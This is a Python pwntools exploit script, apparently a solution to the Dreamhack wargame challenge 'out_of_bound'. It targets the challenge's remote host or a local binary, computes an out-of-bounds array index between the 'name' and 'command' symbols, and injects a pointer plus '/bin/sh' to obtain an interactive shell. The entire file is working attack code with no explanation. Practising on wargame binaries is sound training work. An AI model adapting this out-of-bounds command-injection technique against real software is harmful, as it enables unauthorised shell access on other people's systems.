from pwn import *
import sys

context.log_level='debug'

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('host1.dreamhack.games',10989)
elif sys.argv[1]=="-l":
    p = process('out_of_bound')
else:
    log.info("options: -l for local, -r for remote")
    exit(0)
e=ELF('out_of_bound')

name_addr=e.symbols['name']
command_addr=e.symbols['command']
offset=(name_addr-command_addr)/4

log.info("name addr: "+hex(name_addr))
log.info("command addr: "+hex(command_addr))
log.info("name_command_offset: "+hex(offset))

command=p32(name_addr+4)
command+="/bin/sh"

p.recvuntil("name: ")
p.send(command)

p.recvuntil("want?: ")
p.send(str(offset))

p.interactive()